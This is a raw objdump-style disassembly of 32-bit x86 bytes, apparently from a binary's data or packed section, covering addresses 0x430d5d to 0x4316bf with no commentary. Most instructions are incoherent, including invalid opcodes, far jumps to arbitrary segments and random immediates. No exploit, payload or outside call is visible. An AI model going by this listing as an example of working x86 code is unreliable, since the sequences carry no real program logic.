  430d5d:	je     0x430cef
  430d5f:	adc    ebx,esp
  430d61:	and    eax,0xdf0e96b9
  430d66:	test   BYTE PTR [eax+ebx*1-0xd966a7a],dh
  430d6d:	sub    ah,ch
  430d6f:	or     dh,BYTE PTR [eax+0x7178a027]
  430d75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430d76:	not    BYTE PTR [edx-0x7e195cb8]
  430d7c:	mov    bl,0xe3
  430d7e:	dec    edi
  430d7f:	jmp    0xedd1:0x4bec08ec
  430d86:	fnsave es:[eax+0x51]
  430d8a:	pop    ds
  430d8b:	retf   0xc3a0
  430d8e:	call   0x6d55:0x8efbedf1
  430d95:	mov    bl,0x95
  430d97:	fcomi  st,st(6)
  430d99:	bound  edx,QWORD PTR [ecx-0x7342f4f1]
  430d9f:	xchg   ecx,eax
  430da0:	add    al,0x49
  430da2:	les    ecx,FWORD PTR [edx-0x3]
  430da5:	pop    edi
  430da6:	call   0x86128f0e
  430dab:	xchg   ecx,eax
  430dac:	scas   eax,DWORD PTR es:[edi]
  430dad:	mov    eax,0xc3dd73ee
  430db2:	(bad)  [esi-0x1c]
  430db5:	shl    DWORD PTR [esi-0x4a6f96e1],0xf3
  430dbc:	pop    ecx
  430dbd:	jmp    0x430d98
  430dbf:	lods   eax,DWORD PTR ds:[esi]
  430dc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430dc1:	pop    es
  430dc2:	(bad)  
  430dc3:	ret    
  430dc4:	add    DWORD PTR [edi+0x44],edx
  430dc7:	hlt    
  430dc8:	adc    esi,DWORD PTR [ebx+0x2f]
  430dcb:	xchg   bl,dh
  430dcd:	dec    eax
  430dce:	mov    edx,0xac87dd09
  430dd3:	loop   0x430dbe
  430dd5:	loope  0x430d99
  430dd7:	cmp    DWORD PTR [ebp+ebx*8-0x61],edi
  430ddb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430ddc:	jns    0x430e2e
  430dde:	and    bl,BYTE PTR [ebp+edx*2+0x27]
  430de2:	lock es sbb edx,eax
  430de6:	xchg   esp,eax
  430de7:	and    cl,BYTE PTR [ecx+eiz*8]
  430dea:	ins    DWORD PTR es:[edi],dx
  430deb:	and    al,BYTE PTR [esi]
  430ded:	push   esp
  430dee:	inc    ebp
  430def:	(bad)  
  430df0:	popf   
  430df1:	sub    ecx,DWORD PTR [ebp+ebx*2+0x7ef139c2]
  430df8:	out    dx,eax
  430df9:	pusha  
  430dfa:	inc    edx
  430dfb:	jmp    0x886e:0x4d31e140
  430e02:	jmp    0x9542:0x61368eb5
  430e09:	sar    BYTE PTR [eax+ecx*4-0x3b],1
  430e0d:	adc    bh,BYTE PTR [ecx-0x6606dd9a]
  430e13:	mov    DWORD PTR [ecx-0x6ab0857f],esp
  430e19:	push   ecx
  430e1a:	cmp    DWORD PTR [ebx-0x236cef12],ecx
  430e20:	data16 sub al,0x4d
  430e23:	add    BYTE PTR [ecx],0xbe
  430e26:	call   0x85a4c52e
  430e2b:	and    DWORD PTR [edx-0x9],0x302aafab
  430e32:	(bad)  
  430e34:	xor    ecx,edx
  430e36:	adc    edi,esp
  430e38:	push   edx
  430e39:	xchg   edi,eax
  430e3a:	sbb    ah,dl
  430e3c:	mov    DWORD PTR [edi+0x7d],0x49db
	...
  430eb3:	add    BYTE PTR [edi+eiz*2],al
  430eb6:	std    
  430eb7:	aaa    
  430eb8:	(bad)  
  430eb9:	mov    edi,0x8a6677ce
  430ebe:	retf   
  430ebf:	jne    0x430ef0
  430ec1:	lods   al,BYTE PTR ds:[esi]
  430ec2:	inc    ebx
  430ec3:	mov    ?,WORD PTR [ebx-0xafffdfd]
  430ec9:	add    BYTE PTR [eax],al
  430ecb:	add    BYTE PTR ds:0xdf6a98d0,cl
  430ed1:	jg     0x430ecb
  430ed3:	xchg   edi,eax
  430ed4:	mov    eax,0x8517b6eb
  430ed9:	jge    0x430ee4
  430edb:	std    
  430edc:	outs   dx,BYTE PTR ds:[esi]
  430edd:	fcomp  QWORD PTR [edi+0xf68f498]
  430ee3:	adc    cl,bl
  430ee5:	fild   DWORD PTR [edx-0x71055b11]
  430eeb:	and    ebp,0x4e0b41d5
  430ef1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430ef2:	inc    edx
  430ef3:	xor    al,0x16
  430ef5:	and    al,0x8b
  430ef7:	das    
  430ef8:	jno    0x430f6c
  430efa:	push   0xa725ba7b
  430eff:	retf   
  430f00:	retf   0xb803
  430f03:	popf   
  430f04:	int    0x25
  430f06:	fisubr WORD PTR [edx-0x1a1c2ef9]
  430f0c:	xor    esp,DWORD PTR [edi]
  430f0e:	xchg   ebp,eax
  430f0f:	mov    cl,0xfd
  430f11:	jmp    0x798e46b6
  430f16:	in     eax,0xda
  430f18:	mov    ds:0xbed02217,eax
  430f1d:	fadd   DWORD PTR [edi+0x617778d6]
  430f23:	fnstcw WORD PTR [eax]
  430f25:	stos   BYTE PTR es:[edi],al
  430f26:	fsubr  QWORD PTR [ebp-0x5993de7e]
  430f2c:	inc    edi
  430f2d:	mov    esi,0x180ab8c5
  430f32:	aaa    
  430f33:	shl    BYTE PTR [ecx-0x24],1
  430f36:	das    
  430f37:	sub    BYTE PTR [ebx],al
  430f39:	sbb    DWORD PTR [esi],esp
  430f3b:	push   edi
  430f3c:	imul   esi,ecx,0xffffffcf
  430f3f:	push   edi
  430f40:	push   edi
  430f41:	(bad)  
  430f42:	ror    BYTE PTR [eax-0x6e],0x96
  430f46:	call   0xe5c5:0x26d98837
  430f4d:	pop    ebx
  430f4e:	push   esp
  430f4f:	pop    es
  430f50:	aam    0x70
  430f52:	cwde   
  430f53:	add    eax,0x92cf4b78
  430f58:	push   0x5731a3fa
  430f5d:	push   0xde3dde2
  430f62:	jo     0x430fd9
  430f64:	(bad)  
  430f65:	mov    edx,0xd00b0ed5
  430f6a:	nop
  430f6b:	out    dx,al
  430f6c:	test   BYTE PTR [edi+ebx*8-0x448568bd],0x83
  430f74:	cmp    dh,bh
  430f76:	hlt    
  430f77:	inc    eax
  430f78:	lock into 
  430f7a:	les    ecx,FWORD PTR [ebp-0x5f]
  430f7d:	in     eax,dx
  430f7e:	icebp  
  430f7f:	data16 int 0x9d
  430f82:	rcl    DWORD PTR [edi+0x55],cl
  430f85:	adc    BYTE PTR [eax-0x78f6d122],ah
  430f8b:	add    ebx,esi
  430f8d:	push   0x127dfe7c
  430f92:	dec    ebx
  430f93:	cmp    ebx,ebx
  430f95:	into   
  430f96:	add    dl,BYTE PTR [eax-0x6b2426f4]
  430f9c:	jae    0x431009
  430f9e:	or     ebp,DWORD PTR [ecx]
  430fa0:	and    bh,dl
  430fa2:	push   ds
  430fa3:	mul    DWORD PTR [eax+0x23668083]
  430fa9:	jmp    0x430fc7
  430fab:	mov    cl,0x68
  430fad:	ins    BYTE PTR es:[edi],dx
  430fae:	xor    bh,BYTE PTR [esi-0x895071b]
  430fb4:	fnstsw WORD PTR [ecx-0x27de2ea9]
  430fba:	shr    DWORD PTR [esi],0x6e
  430fbd:	inc    eax
  430fbe:	push   0x61
  430fc0:	mov    ds:0x0,al
	...
  431031:	add    BYTE PTR [eax],al
  431033:	add    bh,al
  431035:	ins    DWORD PTR es:[edi],dx
  431036:	aam    0xb5
  431038:	(bad)  
  431039:	mov    ebp,0xead87fe7
  43103e:	fs dec esp
  431040:	xor    ch,BYTE PTR [eax+0x4a8c936]
  431046:	add    al,BYTE PTR [eax]
  431048:	jne    0x43104a
  43104a:	add    BYTE PTR [eax],al
  43104c:	xchg   ebp,eax
  43104d:	jmp    0x4310b1
  43104f:	mov    ds:0xcfd08cda,eax
  431054:	mov    eax,0x87ffac5f
  431059:	mov    esp,0x8c7038dd
  43105e:	ja     0x4310ad
  431060:	sub    eax,0xacef789b
  431065:	std    
  431066:	push   edx
  431067:	bnd jmp 0x4310a2
  43106a:	sti    
  43106b:	adc    dl,dh
  43106d:	push   eax
  43106e:	push   ds
  43106f:	loope  0x431056
  431071:	xchg   esi,eax
  431072:	mov    edi,0xc0144f12
  431077:	fadd   QWORD PTR [esi]
  431079:	sub    dh,dh
  43107b:	mov    ?,WORD PTR [ecx]
  43107d:	ins    DWORD PTR es:[edi],dx
  43107e:	push   ebx
  43107f:	imul   edx,ecx,0x3df82b10
  431085:	jg     0x431028
  431087:	xor    DWORD PTR [ebx+0x3cfb0b4b],edi
  43108d:	sar    esp,cl
  43108f:	icebp  
  431090:	shl    DWORD PTR [edi+0x37256b04],0x67
  431097:	jo     0x431109
  431099:	xchg   esp,eax
  43109a:	xlat   BYTE PTR ds:[ebx]
  43109b:	pop    ecx
  43109c:	xor    ah,BYTE PTR [edx]
  43109e:	inc    esi
  43109f:	xchg   edx,eax
  4310a0:	fidiv  DWORD PTR [ecx]
  4310a2:	int    0x59
  4310a4:	add    DWORD PTR [esi-0x65],edx
  4310a7:	fnstcw WORD PTR [edi+eax*4-0x78]
  4310ab:	xchg   ebx,eax
  4310ac:	imul   esi,DWORD PTR [eax+eax*4+0x4d],0x1f
  4310b1:	push   es
  4310b2:	in     eax,dx
  4310b3:	inc    BYTE PTR [esi+0x40]
  4310b6:	cmp    bl,ch
  4310b8:	adc    BYTE PTR [edx-0x28],ah
  4310bb:	sbb    cl,ch
  4310bd:	jns    0x43104c
  4310bf:	ret    
  4310c0:	loop   0x4310c2
	...
  431132:	add    BYTE PTR [eax],al
  431134:	dec    ebp
  431135:	push   ebp
  431136:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  43113c:	mov    esp,ebp
  43113e:	or     al,ah
  431140:	dec    ebp
  431141:	add    bh,al
  431143:	add    BYTE PTR [eax],cl
  431145:	add    BYTE PTR [eax],al
  431147:	mov    DWORD PTR [eax],0x3ef44545
  43114d:	add    BYTE PTR ss:[ebp-0x70b6375],al
  431154:	retf   
  431155:	(bad)  
  431156:	enter  0x4d45,0xb8
  43115a:	mov    edi,DWORD PTR [ecx]
  43115c:	hlt    
  43115d:	test   ebx,ecx
  43115f:	pushf  
  431160:	enter  0x4df8,0x8b
  431164:	mov    DWORD PTR [ebp+0x8],0x894708
  43116b:	inc    ebp
  43116c:	mov    ebp,0xff8bfffc
  431171:	dec    ebp
  431172:	mov    ch,0xf4
  431174:	call   DWORD PTR [ebx-0x1]
  431177:	mov    ebx,0x8005122
  43117c:	call   DWORD PTR [ecx+0x8]
  43117f:	pop    es
  431180:	jmp    0xb8:0x9cb4533
  431187:	cdq    
  431188:	mov    esi,DWORD PTR [edx-0xc]
  43118b:	xor    al,bl
  43118d:	add    BYTE PTR [ecx+0x3c83203],bl
  431193:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  431199:	mov    eax,DWORD PTR [ebx-0xb87b3]
  43119f:	xor    eax,DWORD PTR [eax]
  4311a1:	retf   
  4311a2:	ret    
  4311a3:	add    eax,esi
  4311a5:	enter  0x8945,0x64
  4311a9:	dec    ebp
  4311aa:	sbb    ah,cl
  4311ac:	add    BYTE PTR [ebx-0xb87b277],cl
  4311b2:	dec    DWORD PTR [ebx-0xbcfb275]
  4311b8:	test   DWORD PTR [ebx],esi
  4311ba:	dec    ebx
  4311bc:	inc    DWORD PTR [ebx]
  4311be:	inc    eax
  4311bf:	enter  0x8989,0x64
  4311c3:	(bad)  
  4311c4:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4311c8:	cld    
  4311c9:	dec    DWORD PTR [ebp-0xa90001]
  4311cf:	push   edi
  4311d0:	mov    BYTE PTR [edx+0x1],ch
  4311d3:	and    BYTE PTR [eax],al
  4311d5:	pop    ecx
  4311d6:	inc    ebp
  4311d7:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4311dd:	push   0xffffff89
  4311df:	pop    ecx
  4311e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4311e1:	dec    ebp
  4311e2:	add    BYTE PTR [ecx+0x45fc088b],cl
  4311e8:	jne    0x431232
  4311ea:	lea    eax,[eax]
  4311ec:	fs (bad) 
  4311ee:	dec    DWORD PTR [eax]
  4311f0:	mov    DWORD PTR [eax],eax
  4311f2:	test   al,0x0
  4311f4:	add    BYTE PTR [ebp-0x18],cl
  4311f7:	xor    ebp,DWORD PTR [edx]
  4311f9:	add    eax,DWORD PTR [eax]
  4311fb:	mov    eax,eax
  4311fd:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  431204:	inc    ebp
  431205:	mov    DWORD PTR [ebx+0x459408],ecx
  43120b:	popa   
  43120c:	mov    esp,DWORD PTR [ebp-0x75]
  43120f:	(bad)  
  431210:	cld    
  431211:	inc    eax
  431212:	cmp    bh,0x1
  431215:	lea    eax,[eax]
  431217:	and    BYTE PTR [eax],al
  431219:	inc    DWORD PTR [ecx-0x18]
  43121c:	mov    ecx,DWORD PTR [ebx]
  43121e:	cld    
  43121f:	add    BYTE PTR [ecx+0x75014d],cl
  431225:	(bad)  
  431226:	xchg   ebp,eax
  431227:	sar    bh,1
  431229:	inc    eax
  43122a:	inc    DWORD PTR [eax]
  43122c:	mov    eax,DWORD PTR [ebp-0x4]
  43122f:	xor    edx,DWORD PTR [edx+0x7201be]
  431235:	add    BYTE PTR [edx],dl
  431237:	(bad)  
  431238:	nop
  431239:	inc    ebp
  43123a:	add    BYTE PTR [ebx-0x5afb0c00],cl
  431240:	mov    al,0xff
  431242:	add    bh,bh
  431244:	add    BYTE PTR [ebx],dh
  431246:	inc    DWORD PTR [ebx]
  431248:	sbb    al,0x89
  43124a:	jne    0x431228
  43124c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  431252:	mov    eax,DWORD PTR [ebp-0xff0048]
  431258:	mov    DWORD PTR [eax-0x70],0xe870e989
  43125f:	inc    DWORD PTR [ebp-0x75]
  431262:	(bad)  [esi+ebp*8]
  431265:	test   DWORD PTR [esi-0x1],esp
  431268:	inc    ebp
  431269:	(bad)  
  43126a:	aas    
  43126b:	inc    ebp
  43126c:	(bad)  
  43126d:	lea    edi,[eax+edi*2-0x1]
  431271:	inc    edi
  431273:	mov    DWORD PTR [ecx],edi
  431275:	mov    al,ds:0x8b8000c7
  43127a:	call   0x45d0f57b
  43127f:	(bad)  
  431280:	out    dx,al
  431281:	(bad)  
  431282:	fisttp WORD PTR [eax+0x8801c7]
  431288:	jecxz  0x4312cf
  43128a:	call   0xe83f588e
  43128f:	lea    edi,[edi]
  431291:	(bad)  
  431292:	call   0xcb3d96
  431297:	add    DWORD PTR [ebx-0x7f570400],ecx
  43129d:	add    BYTE PTR [ecx],al
  43129f:	test   DWORD PTR [eax],eax
  4312a1:	wrmsr  
  4312a3:	jae    0x431292
  4312a5:	add    BYTE PTR [eax],al
  4312a7:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  4312ad:	add    esp,edi
  4312af:	add    BYTE PTR [eax+0x450108],al
  4312b5:	mov    edi,DWORD PTR [ebp-0x6c]
  4312b8:	add    DWORD PTR [eax],0x4
  4312bb:	mov    eax,DWORD PTR [ebp+0x3]
  4312be:	mov    edi,DWORD PTR [esp+edi*8]
  4312c1:	dec    ebp
  4312c2:	nop
  4312c3:	mov    eax,DWORD PTR [ecx]
  4312c5:	fadd   DWORD PTR [eax]
  4312c7:	add    BYTE PTR [esi],al
  4312c9:	lea    eax,[eax]
  4312cb:	pusha  
  4312cc:	push   eax
  4312cd:	inc    DWORD PTR [ebp+0x52]
  4312d0:	call   DWORD PTR [ebp-0x7b]
  4312d3:	mov    esi,DWORD PTR [ebp-0x74]
  4312d6:	mov    eax,DWORD PTR [eax]
  4312d8:	cld    
  4312d9:	mov    eax,DWORD PTR [eax+0x880103]
  4312df:	add    BYTE PTR [ebp+0x6a],bh
  4312e2:	cmp    edi,0x10
  4312e5:	mov    WORD PTR [ebp+0x0],es
  4312e8:	mov    edx,DWORD PTR [edx-0x4]
  4312eb:	push   ecx
  4312ec:	nop
  4312ed:	inc    DWORD PTR [ecx]
  4312ef:	cld    
  4312f0:	add    BYTE PTR [ebp-0x24],bh
  4312f3:	mov    eax,DWORD PTR [eax]
  4312f5:	cld    
  4312f6:	push   eax
  4312f7:	nop
  4312f8:	inc    ebp
  4312f9:	add    edi,edi
  4312fb:	add    BYTE PTR [ebx+0x4de2f445],cl
  431301:	jmp    0xe33b:0x9403c733
  431308:	movntq QWORD PTR [esi],mm6
  43130b:	mov    DWORD PTR [eax],0xb87e8b98
  431311:	test   ebx,eax
  431313:	jmp    DWORD PTR [edi-0x1]
  431316:	int    0xe9
  431318:	sub    esp,esi
  43131a:	add    eax,DWORD PTR [ebp-0x30]
  43131d:	fild   WORD PTR [ebp+0x3f]
  431320:	cmp    eax,edi
  431322:	je     0xcc43f944
  431328:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  43132f:	(bad)  
  431330:	jne    0x4312be
  431332:	mov    ebx,ecx
  431334:	cld    
  431335:	jle    0x43137c
  431337:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  43133d:	inc    ebp
  43133e:	call   0xeb3cce
  431343:	add    BYTE PTR [ebx-0x7f170301],cl
  431349:	add    DWORD PTR es:[eax],eax
  43134c:	add    al,al
  43134e:	xor    BYTE PTR [eax+0x41],dl
  431351:	inc    ebp
  431352:	add    BYTE PTR [ebx+0xfcd88b],cl
  431358:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  43135e:	add    DWORD PTR [ecx+0x458be845],ecx
  431364:	fmul   DWORD PTR [ebx+0x8bb800]
  43136a:	cld    
  43136b:	call   0xd83e30
  431370:	dec    DWORD PTR [ebx+0x1090e8ff]
  431376:	add    al,al
  431378:	push   eax
  431379:	es inc ebp
  43137b:	inc    ebp
  43137c:	mov    ecx,DWORD PTR [ebx+0xd89c]
  431382:	dec    DWORD PTR [ebx-0x3ff70301]
  431388:	mov    DWORD PTR gs:[eax],eax
  43138b:	call   0x8b6b5950
  431390:	inc    ebp
  431391:	mov    eax,0xe8d8008b
  431396:	add    BYTE PTR [ecx],ch
  431398:	mov    eax,DWORD PTR [eax]
  43139a:	cld    
  43139b:	mov    eax,eax
  43139d:	call   0x462b23f7
  4313a2:	sub    DWORD PTR [ebx-0x3c743000],ecx
  4313a8:	cld    
  4313a9:	mov    BYTE PTR [eax+0x8401c1],0x1
  4313b0:	xor    BYTE PTR [eax],al
  4313b2:	push   edi
  4313b3:	inc    ebp
  4313b4:	mov    DWORD PTR [ebx],esi
  4313b6:	in     al,0xb9
  4313b8:	inc    ebp
  4313b9:	lea    ecx,[ebx-0x3c370301]
  4313bf:	dec    ebp
  4313c0:	cdq    
  4313c1:	mov    esi,DWORD PTR [edx]
  4313c3:	or     BYTE PTR [ebx],al
  4313c5:	ror    DWORD PTR [ebp-0xfebf79],0x0
  4313cc:	call   0x433d16
  4313d1:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4313d7:	jge    0x43140c
  4313d9:	mov    eax,DWORD PTR [ebx]
  4313db:	cld    
  4313dc:	lea    edx,[eax+0xff0120]
  4313e2:	call   0x433d76
  4313e7:	push   eax
  4313e8:	inc    DWORD PTR [ebp-0x1c]
  4313eb:	mov    ecx,DWORD PTR [ebp-0x58]
  4313ee:	xor    eax,DWORD PTR [eax]
  4313f0:	add    edi,edi
  4313f2:	cmp    ebp,eax
  4313f4:	jne    0x43141c
  4313f6:	mov    DWORD PTR [eax],0x8b004dd8
  4313fc:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  431403:	mov    eax,ebx
  431405:	cld    
  431406:	test   BYTE PTR [eax+0x320199],bh
  43140c:	mov    DWORD PTR [ebp+0x8],esi
  43140f:	xor    eax,DWORD PTR [ebp-0x73]
  431412:	test   DWORD PTR [esp+esi*2-0x1],edi
  431416:	mov    ebp,eax
  431418:	mov    eax,0x33004d29
  43141d:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  431423:	add    DWORD PTR [eax],eax
  431425:	add    BYTE PTR [ebp+0x30],al
  431428:	mov    edx,DWORD PTR [edi-0x48]
  43142b:	add    ebx,0xffffffe4
  43142e:	addr16 test ebp,ecx
  431431:	je     0x43145e
  431433:	mov    eax,DWORD PTR [ebx]
  431435:	cld    
  431436:	sar    BYTE PTR [eax+0x3b0145],1
  43143c:	pcmpeqw mm4,mm6
  43143f:	xor    edi,edi
  431441:	lea    ecx,[ebx-0x239c7470]
  431447:	add    BYTE PTR [ebp+0x50],cl
  43144a:	cmp    eax,DWORD PTR [ebp+0x75]
  43144d:	mov    ebp,DWORD PTR [eax-0x68]
  431450:	test   DWORD PTR [eax],eax
  431452:	clc    
  431453:	push   DWORD PTR [ebp-0x1]
  431456:	lea    ecx,[eax]
  431458:	int3   
  431459:	inc    ebp
  43145a:	call   0xfb44ea
  43145f:	jne    0x431459
  431461:	xor    edi,DWORD PTR [ebp-0x41]
  431464:	jmp    0x4314d8
  431466:	mov    eax,DWORD PTR [eax]
  431468:	mov    eax,0x339545c7
  43146d:	inc    DWORD PTR [ebx]
  43146f:	push   DWORD PTR [ecx]
  431471:	aaa    
  431472:	mov    eax,DWORD PTR [eax]
  431474:	jmp    0x4314c6
  431476:	mov    eax,DWORD PTR [ebp-0x3c]
  431479:	mov    eax,eax
  43147b:	cld    
  43147c:	clc    
  43147d:	ret    
  43147e:	test   bh,al
  431480:	pop    es
  431481:	xchg   ebp,eax
  431482:	add    bh,bh
  431484:	inc    ebp
  431485:	dec    DWORD PTR [edi]
  431487:	and    DWORD PTR [ebx],ebp
  431489:	add    BYTE PTR [eax],al
  43148b:	push   eax
  43148c:	jbe    0x4314e3
  43148e:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  431494:	or     al,0xcf
  431496:	inc    eax
  431497:	enter  0x745,0x72
  43149b:	inc    ebp
  43149c:	mov    eax,DWORD PTR [ecx]
  43149e:	int3   
  43149f:	add    BYTE PTR [ebp-0x75],al
  4314a2:	ss mov eax,0x33c74d9c
  4314a8:	ror    BYTE PTR [ebp+0x72f80885],1
  4314ae:	inc    ebp
  4314af:	add    BYTE PTR [ebx-0x3c7423bb],cl
  4314b5:	fadd   st,st(6)
  4314b7:	rol    BYTE PTR [ebp+0x12],0x8b
  4314bb:	inc    ebp
  4314bc:	fmul   QWORD PTR [ebx-0x3c39233d]
  4314c2:	inc    ebp
  4314c3:	test   bh,al
  4314c5:	cdq    
  4314c6:	clc    
  4314c7:	xor    al,BYTE PTR [ebp+0x45dcf889]
  4314cd:	inc    ebp
  4314ce:	cmp    BYTE PTR [ebx],dh
  4314d0:	pushf  
  4314d1:	mov    ecx,0xffb48dc7
  4314d6:	test   eax,ecx
  4314d8:	clc    
  4314d9:	dec    ebp
  4314da:	inc    ebp
  4314db:	mov    edi,DWORD PTR [edx]
  4314dd:	or     BYTE PTR [ecx+eax*8-0x15b7939],bl
  4314e4:	test   edi,edi
  4314e6:	clc    
  4314e7:	test   DWORD PTR [ebp+0x45],0x89c8b3c
  4314ee:	(bad)  
  4314ef:	enter  0x18e8,0x85
  4314f3:	ss clc 
  4314f5:	pushf  
  4314f6:	inc    ebp
  4314f7:	dec    DWORD PTR [ebx-0x3cba0f04]
  4314fd:	push   eax
  4314fe:	xabort 0x7d
  431501:	add    BYTE PTR [ebx],bh
  431503:	mov    ecx,DWORD PTR [edi]
  431505:	mov    DWORD PTR [eax],ebx
  431507:	les    eax,FWORD PTR [eax]
  431509:	adc    ebp,ecx
  43150b:	dec    ebp
  43150c:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  431512:	mov    ecx,esi
  431514:	lock or al,cl
  431517:	clc    
  431518:	inc    ebp
  431519:	add    esi,DWORD PTR [ebx]
  43151b:	jge    0x431520
  43151d:	xor    edi,DWORD PTR [ebx]
  43151f:	cmp    ecx,DWORD PTR [edi]
  431521:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  431526:	mov    edi,DWORD PTR [ecx]
  431528:	test   al,0xcc
  43152a:	dec    ebp
  43152b:	test   BYTE PTR [ebx],dh
  43152d:	pop    es
  43152e:	xor    eax,DWORD PTR [eax]
  431530:	add    ecx,DWORD PTR [esi]
  431532:	add    ecx,eax
  431534:	psraw  mm0,mm1
  431537:	sub    BYTE PTR [ebp+0x38],cl
  43153a:	mov    edi,DWORD PTR [ebx]
  43153c:	lock int3 
  43153e:	shl    edx,1
  431540:	rol    BYTE PTR [ebp+0xc],1
  431543:	mov    DWORD PTR [ebp-0x24],0xf8038533
  43154a:	jmp    0x7c1594
  43154f:	pushf  
  431550:	inc    ebp
  431551:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  431557:	xor    ecx,ebx
  431559:	add    ecx,esi
  43155b:	mov    esi,eax
  43155d:	enter  0x45af,0x8b
  431561:	xor    ecx,eax
  431563:	add    edx,DWORD PTR [ebp-0x77]
  431566:	sub    ecx,DWORD PTR [eax]
  431568:	cmp    eax,DWORD PTR [ebp+0x77]
  43156b:	(bad)  
  43156c:	mov    ebx,DWORD PTR [eax+ebp*4+0xa889c7]
  431573:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  431579:	cmp    esi,DWORD PTR [ebx]
  43157b:	pushf  
  43157c:	xor    eax,edi
  43157e:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  431585:	inc    ebp
  431586:	dec    ebp
  431587:	cmp    eax,0xc7f09c8b
  43158c:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  431593:	inc    ebp
  431594:	jmp    0x4315d5
  431596:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  43159d:	dec    ebp
  43159e:	xor    esi,DWORD PTR [ebx]
  4315a0:	add    eax,DWORD PTR [ebx]
  4315a2:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  4315a8:	dec    ebp
  4315a9:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  4315af:	out    dx,eax
  4315b0:	rol    BYTE PTR [eax],1
  4315b2:	add    eax,0xebc8458b
  4315b7:	dec    ebp
  4315b8:	mov    ebp,DWORD PTR [ebx]
  4315ba:	mov    esp,0x33f84d8b
  4315bf:	ret    
  4315c0:	xor    eax,esi
  4315c2:	add    ecx,eax
  4315c4:	add    eax,DWORD PTR [edx+0xc1010f]
  4315ca:	dec    ebp
  4315cb:	inc    ebp
  4315cc:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4315d2:	ror    bl,1
  4315d4:	add    eax,0xebc645ce
  4315d9:	scas   eax,DWORD PTR es:[edi]
  4315da:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4315e0:	xor    ebp,DWORD PTR [ebx]
  4315e2:	xor    edi,DWORD PTR [ebx]
  4315e4:	add    esi,DWORD PTR [edi+0x3]
  4315e7:	mov    ecx,DWORD PTR [edi]
  4315e9:	clc    
  4315ea:	rol    ebx,0x4d
  4315ed:	(bad)  
  4315ee:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  4315f5:	mov    ah,0x45
  4315f7:	dec    ebp
  4315f8:	jbe    0x43162d
  4315fa:	mov    esi,DWORD PTR [ebx]
  4315fc:	call   0x33466304
  431601:	rdpmc  
  431603:	rol    DWORD PTR [ebx],0x4d
  431606:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  43160c:	inc    ebp
  43160d:	ror    BYTE PTR [ebx+0x45450808],1
  431613:	jmp    0x10b16a3
  431618:	inc    ebp
  431619:	inc    ebp
  43161a:	(bad)  
  43161b:	mov    ebx,eax
  43161d:	clc    
  43161e:	test   ebx,eax
  431620:	clc    
  431621:	retf   
  431622:	inc    ebp
  431623:	into   
  431624:	mov    esi,0x8b85afec
  43162a:	clc    
  43162b:	enter  0x5545,0x38
  43162f:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  431636:	ret    
  431637:	mov    ah,0xc6
  431639:	addr16 push 0x338b4545
  43163f:	clc    
  431640:	add    eax,ebx
  431642:	loopne 0x43160f
  431644:	dec    ebp
  431645:	into   
  431646:	mov    al,dh
  431648:	or     BYTE PTR [edi-0x37ff748e],ch
  43164e:	inc    ebp
  43164f:	push   ebp
  431650:	mov    ebp,DWORD PTR [ebx]
  431652:	in     al,dx
  431653:	cmp    eax,ebx
  431655:	ja     0x43169c
  431657:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  43165d:	inc    ebp
  43165e:	cdq    
  43165f:	mov    esi,DWORD PTR [edx]
  431661:	clc    
  431662:	mov    bl,al
  431664:	xlat   BYTE PTR ds:[ebx]
  431665:	retf   
  431666:	inc    ebp
  431667:	into   
  431668:	mov    eax,esi
  43166a:	in     al,dx
  43166b:	scas   eax,DWORD PTR es:[edi]
  43166c:	retf   
  43166d:	mov    ecx,DWORD PTR [ebp-0x38]
  431670:	mov    edx,DWORD PTR [ebp-0x24]
  431673:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8867]
  43167a:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  431681:	mov    eax,DWORD PTR [ebx]
  431683:	clc    
  431684:	loopne 0x431649
  431686:	push   ebp
  431687:	retf   
  431688:	mov    dh,al
  43168a:	adc    esi,ecx
  43168c:	jb     0x43163d
  43168e:	add    BYTE PTR [ebx+0x558bc845],cl
  431694:	in     al,dx
  431695:	sub    eax,ebx
  431697:	cmp    ecx,ebx
  431699:	mov    eax,esi
  43169b:	mov    esp,0x45af03ce
  4316a0:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  4316a6:	mov    eax,ebx
  4316a8:	in     al,dx
  4316a9:	into   
  4316aa:	dec    ebp
  4316ab:	(bad)  
  4316ac:	xor    ebp,DWORD PTR [edi+0x80f8903]
  4316b2:	rol    DWORD PTR [ebp+0x4d],0x89
  4316b6:	xor    esp,esp
  4316b8:	sub    eax,DWORD PTR [ebp-0x75]
  4316bb:	add    ebp,esp
  4316bd:	mov    al,0x55
  4316bf:	inc    ebp
